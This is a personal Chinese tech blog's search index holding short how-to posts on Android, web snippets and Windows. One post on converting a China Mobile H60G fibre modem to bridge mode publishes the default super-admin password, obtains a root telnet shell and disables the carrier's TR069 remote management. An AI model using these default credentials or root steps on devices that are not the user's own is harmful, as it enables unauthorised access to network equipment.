<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安卓命令切换上网卡(root)</title>
      <link href="/2025/an-zhuo-qie-huan-shang-wang-qia-root/"/>
      <url>/2025/an-zhuo-qie-huan-shang-wang-qia-root/</url>
      
        <content type="html"><![CDATA[<p>在安卓上用shell命令切换上网卡，适合脚本/自动化使用，需要使用root权限运行  </p><a id="more"></a>  <p>下边两个方法自测那个可用（澎湃OS2安卓15方法2可用）</p><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>切到卡1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">settings put global multi_sim_data_call 1</span><br><span class="line">svc data <span class="built_in">disable</span></span><br><span class="line">svc data <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><p>切到卡2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">settings put global multi_sim_data_call 2</span><br><span class="line">svc data <span class="built_in">disable</span></span><br><span class="line">svc data <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>切到卡1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">settings put global multi_sim_data_call 1</span><br><span class="line">setprop persist.radio.default.data 0</span><br><span class="line">am start com.android.stk/.ToneDialog</span><br></pre></td></tr></table></figure><p>切到卡2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">settings put global multi_sim_data_call 2</span><br><span class="line">setprop persist.radio.default.data 1</span><br><span class="line">am start com.android.stk/.ToneDialog</span><br></pre></td></tr></table></figure><p>方法2需要手机USIM卡应用（com.android.stk）可以正常使用（未卸载/冻结）</p><h4 id="生成适合本机使用的脚本"><a href="#生成适合本机使用的脚本" class="headerlink" title="生成适合本机使用的脚本"></a>生成适合本机使用的脚本</h4><p>附一个生成一键切卡的脚本，来自<a href="https://www.coolapk.com/feed/63020520" target="_blank" rel="noopener">酷安@请输入新用户名99</a>，生成的切卡脚本仅适合生成的手机使用，因为部分手机的sim卡主键/序号和卡槽1/卡槽2不对应<br>（sim卡主键/序号可以用<a href="https://github.com/pppscn/SmsForwarder" target="_blank" rel="noopener">短信转发器</a>查看）</p><p><a href="自动化生成切换上网卡脚本.sh">脚本下载</a>，下载后使用mt管理器运行，需要root</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>键盘测试工具</title>
      <link href="/2025/jian-pan-ce-shi-gong-ju/"/>
      <url>/2025/jian-pan-ce-shi-gong-ju/</url>
      
        <content type="html"><![CDATA[<p>工具来自<a href="https://www.bmcx.com/" target="_blank" rel="noopener">便民查询网</a>，使用api集成方便快速使用  </p><a id="more"></a>  <iframe id="api_iframe_bmcx" name="api_iframe_bmcx" src width="100%" height="800" scrolling="no" frameborder="0"></iframe><script type="text/javascript">//接口生成：https://www.bmcx.com/api/document.getElementById("api_iframe_bmcx").src = "https://www.bmcx.com/apiiframe/?api_from=bmcx&api_url=https://keyboard.bmcx.com/&api_width=98%&api_backgroundcolor=FFFFFF&api_agent="+location.href.match(/^.*?\:\/\/[^\/]+\//i)+"p/www.bmcx.com/api/bmcx_api_agent.html&api_navigation=no";</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>移动套餐公示</title>
      <link href="/2025/yi-dong-tao-can-gong-shi/"/>
      <url>/2025/yi-dong-tao-can-gong-shi/</url>
      
        <content type="html"><![CDATA[<p>重新整理的移动套餐公示查询链接  </p><a id="more"></a>  <p>套餐公示（手机版网页）<br><a href="https://h.app.coc.10086.cn/cmcc-app/tariffZoneCP/tariffZoneCPNQD.html?WT.ac_id=P00000010676&amp;prov=531&amp;yx=JH202208231899&amp;touch_id=01-02-10001-2001-BC970" target="_blank" rel="noopener">https://h.app.coc.10086.cn/cmcc-app/tariffZoneCP/tariffZoneCPNQD.html?WT.ac_id=P00000010676&amp;prov=531&amp;yx=JH202208231899&amp;touch_id=01-02-10001-2001-BC970</a></p><p>套餐公示（pc版网页）<br><a href="https://h.app.coc.10086.cn/cmcc-app/pc-pages/tariffZonePers.html?pageId=834148205904408576&amp;prov=531&amp;channelId=P00000010676" target="_blank" rel="noopener">https://h.app.coc.10086.cn/cmcc-app/pc-pages/tariffZonePers.html?pageId=834148205904408576&amp;prov=531&amp;channelId=P00000010676</a><br>pc版可以点击右上角切换查询地区</p><p>移动手机号定向流量范围查询<br><a href="https://dev.coc.10086.cn/coc/web2/newFlowFeeePackage/" target="_blank" rel="noopener">https://dev.coc.10086.cn/coc/web2/newFlowFeeePackage/</a></p><p>pc版线上营业厅<br><a href="https://www.10086.cn/index/sd/index_531_536.html" target="_blank" rel="noopener">https://www.10086.cn/index/sd/index_531_536.html</a><br>进入 不登陆手机号 改地区 下边可以看对应地区的套餐公示</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓老软件适配全面屏</title>
      <link href="/2025/an-zhuo-lao-ruan-jian-gua-pei-quan-mian-ping/"/>
      <url>/2025/an-zhuo-lao-ruan-jian-gua-pei-quan-mian-ping/</url>
      
        <content type="html"><![CDATA[<p>发现新版小米系统没有应用全面屏优化了，老软件得自己动手适配，下边直接开始  </p><a id="more"></a>  <p>反编译安卓apk里的 <code>AndroidManifest.xml</code> ，在 <code>application</code> 标签里添加下边代码即可</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-<span class="class"><span class="keyword">data</span></span></span><br><span class="line">  android:name=<span class="string">"android.max_aspect"</span></span><br><span class="line">  android:value=<span class="string">"2.1"</span> /&gt;</span><br></pre></td></tr></table></figure><p>2.1为支持的最大屏幕比例，如果设备有更长的屏幕比例可以适当调大</p><p>16:9约等于1.77<br>18:9等于2<br>21:9约等于2.33</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">application</span></span><br><span class="line">  ...&gt;</span><br><span class="line">  &lt;meta-data</span><br><span class="line">    android:<span class="built_in">name</span>=<span class="string">"android.max_aspect"</span></span><br><span class="line">    android:value=<span class="string">"2.1"</span> /&gt;</span><br><span class="line">&lt;/<span class="built_in">application</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>移动改桥接</title>
      <link href="/2024/yi-dong-guang-mao-gai-qiao-jie/"/>
      <url>/2024/yi-dong-guang-mao-gai-qiao-jie/</url>
      
        <content type="html"><![CDATA[<p>简单记一次移动光猫改桥接  </p><a id="more"></a>  <p>光猫型号：H60G</p><p>这个型号的光猫开始没有动态管理员密码的，默认管理员账号 <code>CMCCAdmin</code> 密码 <code>aDm8H%MdA</code> ，在使用过程中发现移动后期改成了动态密码</p><p>可以先进入路由器后台查看，如果默认管理员密码可以使用，则可以跳过获取管理员密码步骤</p><h4 id="获取管理员密码"><a href="#获取管理员密码" class="headerlink" title="获取管理员密码"></a>获取管理员密码</h4><p>先使用光猫背后的用户账号登录光猫管理员后台，依次打开 <code>网络</code> - <code>远程管理</code> - <code>认证</code> ,记录下里面的 <code>Password</code> 的值，后续会用到</p><p>使用牙签或卡针捅光猫的Reset孔，多等一会松开，等光猫重置</p><p>光猫重置后使用电脑直连光猫lan口，打开光猫后台，此时可以使用光猫默认管理员账号登录</p><p>账号：CMCCAdmin<br>密码：aDm8H%MdA</p><p>登录依次打开 <code>安全</code> - <code>Telnet配置</code> - 勾选 <code>启用LAN侧Telnet</code>,记录下用户名、密码（也可自定义用户名密码），点击确定</p><p>右上角退出账号登录，选择 <code>设备注册</code> ，输入刚才记录的password值，如果之前没有记录的话只能问宽带安装师傅询问注册码，输入注册码后等待移动下发数据注册网络</p><p>移动数据下发完成后光猫管理员密码会变成动态的，此时使用Telnet修改光猫管理员密码</p><p>按 <code>Win</code> + <code>R</code> 打开运行窗口输入 <code>cmd</code> 确定，打开控制台cmd窗口，输入下边命令后回车</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><blockquote><p>出现telnet不是内部或外部命令的，去Windows可选功能里启用Telnet</p></blockquote><p>输入前边记录的telnet用户名（回车）<br>输入前边记录的telnet密码（回车）  </p><p>识符变成 <code>~$</code> 后输入： <code>su</code> （回车）</p><p>输入密码 <code>aDm8H%MdA</code> （回车）</p><p>标识符变成 <code>/#</code> 此时便是以root用户登录光猫控制台</p><p>修改管理员超级账号为 CMCCAdmin (可自定义)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sidbg 1 DB <span class="builtin-name">set</span> DevAuthInfo 0<span class="built_in"> User </span>CMCCAdmin</span><br></pre></td></tr></table></figure><p>修改管理员超级账号的密码 aDm8H%MdA (可自定义)</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sidbg <span class="number">1</span> DB <span class="keyword">set</span> DevAuthInfo <span class="number">0</span> Pass aDm8H%MdA</span><br></pre></td></tr></table></figure><p>执行上面命令后管理员密码便改为了aDm8H%MdA或自定义的密码</p><h4 id="光猫改桥接"><a href="#光猫改桥接" class="headerlink" title="光猫改桥接"></a>光猫改桥接</h4><p>使用管理员账号登录光猫后台，进入 <code>网络</code> - <code>宽带设置</code> ，在链接名称里选择包含 <code>_INTERNET_R_VID_</code> 的配置，记录下设备的 <code>VLAN ID</code> </p><p>记录VLAN ID后， <code>_INTERNET_R_VID_</code> 配置可以保留也可以删除（建议直接删除）</p><p>在 <code>连接名称</code> 里选择 <code>新建WAN连接</code> </p><p> <code>模式</code> 选择 <code>桥模式</code> </p><p> <code>VLAN模式</code> 选择 <code>改写(tag)</code> </p><p> <code>VLAN ID</code> 里填写刚才记录的VLAN ID</p><p>使能打勾，端口绑定LAN1~4可以全打勾，也可以不选</p><p>DHCP服务器使能取消勾选</p><p>桥类型，我选择的 IP BRIDGE，不知道和PPPOE BRIDGE有何区别<br>业务模式选择INTERNET</p><p>设置完成后确定</p><p>改桥接后可以在路由器设置拨号，移动宽带账号一般为手机号，宽带密码可以询问宽带安装师傅或者自己重置密码</p><h4 id="禁用移动的远程下发配置"><a href="#禁用移动的远程下发配置" class="headerlink" title="禁用移动的远程下发配置"></a>禁用移动的远程下发配置</h4><p>在 <code>网络</code> - <code>宽带设置</code> 里，连接名称选择包含 <code>TR069</code> 的配置，进入浏览器调试（F12/Ctrl+shift+i）,找到使能、修改按钮，把HTML中的 <code>disable</code> 改为 <code>enable</code> 或者直接删掉。然后取消勾选使能，点击修改</p><p>在 <code>网络</code> - <code>远程管理</code> - <code>省级数字家庭管理平台服务器</code> ,使用浏览器调试把使能和下边确定按钮改为可选择（方法同上），取消勾选使能，点击下边确定保存</p><p>修改完后可以再 <code>状态</code> - <code>设备信息</code> 里看到 <code>ITMS注册状态</code> 为 <code>注册失败</code> 便是成功</p><h4 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h4><p>编辑短信 <code>KDMM</code> 发送到 <code>10086</code> 查询</p><p>编辑短信 <code>CZKDMM</code> 发送到 <code>10086</code> 重置宽带密码</p><p>使用中国移动APP，打开 <code>我的</code> - 我的家庭 - <code>家庭专区</code> -宽带服务 - <code>更多内容</code> - <code>密码修改</code> </p><p>部分省市的默认密码 123123、123456、手机号后6位、身份证后6位</p><blockquote><p>我参考恩山论坛帖子修改的，在这里简单记录，详细图文可以在下边帖子里看到<br><a href="https://www.right.com.cn/forum/thread-5475669-1-1.html" target="_blank" rel="noopener">https://www.right.com.cn/forum/thread-5475669-1-1.html</a><br><a href="https://www.right.com.cn/forum/thread-8237756-1-1.html" target="_blank" rel="noopener">https://www.right.com.cn/forum/thread-8237756-1-1.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>js简单弹窗</title>
      <link href="/2024/js-jian-dan-dan-chuang/"/>
      <url>/2024/js-jian-dan-dan-chuang/</url>
      
        <content type="html"><![CDATA[<p>js简单弹窗实现，弹窗默认隐藏，点击Open Popup弹出，点击Close或弹窗外围隐藏，文心一言生成  </p><a id="more"></a>  <p>弹窗效果 </p><p><button id="openPopup">Open Popup</button>  </p><div id="popupContainer" class="popup-container" style="position: fixed;top: 0;left: 0;width: 100%;height: 100%;display: none;justify-content: center;align-items: center;background-color: rgba(0, 0, 0, 0.5);z-index: 1000;">      <div id="popup" class="popup" style="background-color: #fff;border-radius: 10px;padding: 20px;box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);animation: fadeIn 0.3s;">          <h2>Popup Title</h2>          <p>This is a simple popup with rounded corners and a fade-in animation.</p>          <button id="closePopup">Close</button>      </div>  </div>  <script>      document.getElementById('openPopup').addEventListener('click', function() {          document.getElementById('popupContainer').style.display = 'flex';      });      document.getElementById('closePopup').addEventListener('click', function() {          document.getElementById('popupContainer').style.display = 'none';      });      window.addEventListener('click', function(event) {          if (event.target == document.getElementById('popupContainer')) {              document.getElementById('popupContainer').style.display = 'none';          }      });  </script><p>源代码</p><p>HTML代码片段</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;button <span class="built_in">id</span>=<span class="string">"openPopup"</span>&gt;Open Popup&lt;/button&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"popupContainer"</span> <span class="built_in">class</span>=<span class="string">"popup-container"</span> style=<span class="string">"position: fixed;top: 0;left: 0;width: 100%;height: 100%;display: none;justify-content: center;align-items: center;background-color: rgba(0, 0, 0, 0.5);z-index: 1000;"</span>&gt;  </span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"popup"</span> <span class="built_in">class</span>=<span class="string">"popup"</span> style=<span class="string">"background-color: #fff;border-radius: 10px;padding: 20px;box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);animation: fadeIn 0.3s;"</span>&gt;  </span><br><span class="line">        &lt;h2&gt;Popup Title&lt;/h2&gt;  </span><br><span class="line">        &lt;p&gt;This <span class="keyword">is</span> a simple popup <span class="keyword">with</span> rounded corners <span class="keyword">and</span> a fade-<span class="keyword">in</span> animation.&lt;/p&gt;  </span><br><span class="line">        &lt;button <span class="built_in">id</span>=<span class="string">"closePopup"</span>&gt;Close&lt;/button&gt;  </span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;  </span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p>JavaScript代码片段</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">'openPopup'</span>).addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">'popupContainer'</span>).style.display = <span class="string">'flex'</span>;  </span></span><br><span class="line">    &#125;);  </span><br><span class="line">  </span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">'closePopup'</span>).addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">'popupContainer'</span>).style.display = <span class="string">'none'</span>;  </span></span><br><span class="line">    &#125;);  </span><br><span class="line">  </span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;  </span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (event.target == <span class="built_in">document</span>.getElementById(<span class="string">'popupContainer'</span>)) &#123;  </span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">'popupContainer'</span>).style.display = <span class="string">'none'</span>;  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;);  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js 简单弹框toast</title>
      <link href="/2024/js-jian-dan-dan-kuang-toast/"/>
      <url>/2024/js-jian-dan-dan-kuang-toast/</url>
      
        <content type="html"><![CDATA[<p>新建toast.js文件  </p><a id="more"></a>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Toast</span>(<span class="params">msg,duration</span>)</span>&#123;</span><br><span class="line">      duration=<span class="built_in">isNaN</span>(duration)?<span class="number">3000</span>:duration;</span><br><span class="line">      <span class="keyword">var</span> m = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">      m.innerHTML = msg;</span><br><span class="line">      m.style.cssText=<span class="string">"max-width:60%;min-width: 150px;padding:0 14px;height: 40px;color: rgb(255, 255, 255);line-height: 40px;text-align: center;border-radius: 4px;position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);z-index: 999999;background: rgba(0, 0, 0,.7);font-size: 16px;"</span>;</span><br><span class="line">      <span class="built_in">document</span>.body.appendChild(m);</span><br><span class="line">      setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = <span class="number">0.5</span>;</span><br><span class="line">        m.style.webkitTransition = <span class="string">'-webkit-transform '</span> + d + <span class="string">'s ease-in, opacity '</span> + d + <span class="string">'s ease-in'</span>;</span><br><span class="line">        m.style.opacity = <span class="string">'0'</span>;</span><br><span class="line">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">document</span>.body.removeChild(m) &#125;, d * <span class="number">1000</span>);</span><br><span class="line">      &#125;, duration);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>应用：引入toast.js文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Toast</span><span class="params">(<span class="string">'这是一个弹框'</span>,<span class="number">2000</span>)</span></span></span><br></pre></td></tr></table></figure><blockquote><p>转载自 Lingn <a href="https://www.cnblogs.com/lingnweb/p/9956795.html" target="_blank" rel="noopener">https://www.cnblogs.com/lingnweb/p/9956795.html</a></p></blockquote><script>function Toast(msg,duration){      duration=isNaN(duration)?3000:duration;      var m = document.createElement('div');      m.innerHTML = msg;      m.style.cssText="max-width:60%;min-width: 150px;padding:0 14px;height: 40px;color: rgb(255, 255, 255);line-height: 40px;text-align: center;border-radius: 4px;position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);z-index: 999999;background: rgba(0, 0, 0,.7);font-size: 16px;";      document.body.appendChild(m);      setTimeout(function() {        var d = 0.5;        m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d + 's ease-in';        m.style.opacity = '0';        setTimeout(function() { document.body.removeChild(m) }, d * 1000);      }, duration);}</script><br>  <input type="button" onclick="javascript:Toast('toast提示',2000);" value="点击查看弹窗示例">]]></content>
      
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片压缩</title>
      <link href="/2024/tu-pian-ya-suo/"/>
      <url>/2024/tu-pian-ya-suo/</url>
      
        <content type="html"><![CDATA[<p>在线图片压缩工具  </p><a id="more"></a>  <input id="upload" type="file"><div id="imagebox"></div><script> const FILETYPES = ["image/png", "image/jpg", "image/jpeg"]; // 受支持的文件类型 const MAX_FILESIZE = 1024 * 1024 * 3; // 1024 * 1024 为1M const MAX_FILESIZESTRING = "3M"; // 文件大小字符 const COMPRESSRATIO = .5; // 压缩比例 0 - 1 const upload = document.querySelector("#upload"); const imageToBase64 = (file, callback) => {     const reader = new FileReader();     reader.readAsDataURL(file); // 文件转base64     reader.addEventListener("load", (e) => {         callback && callback(e.target.result);     }); }; const compress = (originalImage, compressRatio = 1, callback) => {     const image = new Image();     image.src = originalImage;     // document.body.appendChild(image); // 原图预览     /* 监听图片的load事件 */     image.addEventListener("load", function () {         let [sizeRatio, maxWidth, maxHeight] = [0, 1024, 1024]; // 图片压缩宽高比例和最大宽高         let [imageWidth, imageHeight] = [this.naturalWidth, this.naturalHeight]; // 图片实际宽高         let compressFlag = false; // 图片是否需要压缩         // 如果图片宽度大于最大宽度就等比压缩图片的高度         if (imageWidth > maxWidth) {             compressFlag = true;             sizeRatio = imageWidth / maxWidth;             maxHeight = imageHeight / sizeRatio;         }         // 如果图片高度大于最大高度就等比压缩图片的宽度         if (imageHeight > maxHeight) {             compressFlag = true;             sizeRatio = imageHeight / maxHeight;             maxWidth = imageWidth / sizeRatio;         }         // 如果不需要压缩         if (!compressFlag) {             maxWidth = imageWidth;             maxHeight = imageHeight;         }         // 使用canvas压缩图片         const canvas = document.createElement("canvas");         const ctx = canvas.getContext("2d");         canvas.setAttribute("id", "canvas");         canvas.width = maxWidth;         canvas.height = maxHeight;         // document.body.appendChild(canvas); // canvas预览         ctx.clearRect(0, 0, maxWidth, maxHeight); // 清除画布内所有像素         ctx.drawImage(image, 0, 0, maxWidth, maxHeight); // canvas绘制当前图片         const compressImage = canvas.toDataURL("image/jpeg", compressRatio); // 设置压缩类型和压缩比例获取压缩后的文件         callback && callback(compressImage);     }); } upload.addEventListener("change", function (e) {     const [file] = e.target.files;     if (!file) this.value = ""; // file为空就阻止向下执行     const { type: fileType, size: fileSize } = file; // 获取文件类型和大小     // 检查是否支持的文件类型     if (!FILETYPES.includes(fileType)) {         this.value = "";         alert(`不支持${fileType}类型文件`);         return;     }     // 检查文件大小     if (fileSize > MAX_FILESIZE) {         this.value = "";         alert(`文件不能超过${MAX_FILESIZESTRING}`);         return;     }     imageToBase64(file, (originalImage) => {         compress(originalImage, COMPRESSRATIO, (compressImage) => {             const _img = new Image();             _img.src = compressImage;             const download = document.createElement("a");             download.href = compressImage;             download.innerText = "点击保存";             download.setAttribute("download", file.name + ".jpg");             const p = document.createElement('p');             let imgbox = document.getElementById('imagebox');             imgbox.appendChild(p);             imgbox.appendChild(_img); // 压缩后的图片预览             imgbox.appendChild(p);             imgbox.appendChild(download);             displayInfo('原文件大小', file);             displayInfo('压缩后大小', base64ToFile(compressImage, "demo.jpg"));         });     }); }) function displayInfo(label, file) {     const p = document.createElement('p');     p.innerText = `${label} - ${readableBytes(file.size)}`;     let imgbox = document.getElementById('imagebox');     imgbox.appendChild(p); } function base64ToFile(base64, fileName) {     let arr = base64.split(',');     let mime = arr[0].match(/:(.*?);/)[1];     let bstr = atob(arr[1]);     let n = bstr.length;     let u8arr = new Uint8Array(n);     while (n--) {         u8arr[n] = bstr.charCodeAt(n);     }     return new File([u8arr], fileName, { type: mime }); } function readableBytes(bytes) {     const i = Math.floor(Math.log(bytes) / Math.log(1024)),         sizes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];     return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i]; }</script><blockquote><p>js前端图片压缩，参考<br><a href="https://www.cnblogs.com/yangwenbo/p/16139207.html" target="_blank" rel="noopener">https://www.cnblogs.com/yangwenbo/p/16139207.html</a><br><a href="https://juejin.cn/post/7055605193211117581" target="_blank" rel="noopener">https://juejin.cn/post/7055605193211117581</a>  </p></blockquote><p>临时想用图片压缩时某引擎直接搜图片在线压缩都是广告或付费的，so自己抄了个</p><p>图片在线压缩工具 <a href="https://tool.lu/tinyimage/" target="_blank" rel="noopener">https://tool.lu/tinyimage/</a><br>图文工具箱（在线） <a href="https://imgtool.net/" target="_blank" rel="noopener">https://imgtool.net/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ventoy与传统pe共存</title>
      <link href="/2024/ventoy-yu-chuan-tong-pe-gong-cun/"/>
      <url>/2024/ventoy-yu-chuan-tong-pe-gong-cun/</url>
      
        <content type="html"><![CDATA[<p>在ventoy安装时选择分区设置，勾选保留后部空间，空间可以根据pe大小调整  </p><a id="more"></a>  <p>使用要共存的pe生成pe的ISO文件，推荐使用微pe</p><p>使用分区工具在ventoy重建时保留的空间创建分区，格式为fat16，将微pe的ISO文件解压复制到新建的fat16分区即可</p><p>后续电脑在使用U盘启动时可以看到U盘两个启动入口，分别是ventoy和微pe</p><p>ventoy：<a href="https://www.ventoy.net" target="_blank" rel="noopener">https://www.ventoy.net</a><br>微pe：<a href="https://www.wepe.com.cn" target="_blank" rel="noopener">https://www.wepe.com.cn</a></p><blockquote><p>共存方法来自：<br>【真正的all in one】创建与ventoy完全独立的引导分区，并把UOS系统装进Ventoy里<br><a href="https://m.bilibili.com/video/BV1bQ4y1H7mD" target="_blank" rel="noopener">https://m.bilibili.com/video/BV1bQ4y1H7mD</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关闭Windows自动更新</title>
      <link href="/2024/guan-bi-windows-zi-dong-geng-xin/"/>
      <url>/2024/guan-bi-windows-zi-dong-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>记录一个简单关闭Windows自动更新的方法  </p><a id="more"></a>  <p>使用 <code>WIN + R</code> 打开运行窗口，输入 <code>gpedit.msc</code> 后 <code>确定</code> ，打开 <code>本地组策略编辑器</code> </p><p>在 <code>本地组策略编辑器</code> 依次打开  <code>计算机配置</code> → <code>管理模版</code> → <code>Windows 组件</code> → <code>Windows 更新</code> → <code>指定Intranet Microsoft更新服务位置</code> </p><p>打开 <code>指定Intranet Microsoft更新服务位置</code> 后将 <code>未配置</code> 改为 <code>已启用</code> ，将 <code>设置检测更新的Intranet更新服务</code> 和 <code>设置Intranet统计服务器</code> 、 <code>设置备用下载服务器</code> 全部随便填写一个网址或本机ip（如 <code>https://gddhy.net</code> 或 <code>127.0.0.1</code> ），然后再依次点击 <code>应用</code> 和 <code>确定</code> ，回到Windows更新，会看到已经无法检查更新</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用Java调用cmd命令</title>
      <link href="/2024/shi-yong-java-diao-yong-cmd-ming-ling/"/>
      <url>/2024/shi-yong-java-diao-yong-cmd-ming-ling/</url>
      
        <content type="html"><![CDATA[<p>使用 java 调用 cmd 命令时，使用如下的代码(不需要导入其他库)   <a id="more"></a>  </p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(command); <span class="comment">//command是需要运行的命令</span></span><br></pre></td></tr></table></figure><p>但是呢,这样是运行不了的,要进行异常处理，或者将其抛出:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里选择异常处理</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(command);</span><br><span class="line">&#125; catch (IOException e1) &#123; <span class="comment">// 改自己的异常类</span></span><br><span class="line"> e1.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在,可以运行exe文件,但是若运行 gpedit.msc devmgmt.msc 等工具无反应</p><p>解决办法是,设定cmd的运行模式（这不是java的语法，是cmd的程序参数）:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#转至https://blog.csdn.net/liuyukuan/article/details/5974517</span></span><br><span class="line"><span class="keyword">cmd</span><span class="bash"> /c <span class="built_in">command</span> 执行完命令后关闭命令窗口。 </span></span><br><span class="line"><span class="keyword">cmd</span><span class="bash"> /k <span class="built_in">command</span> 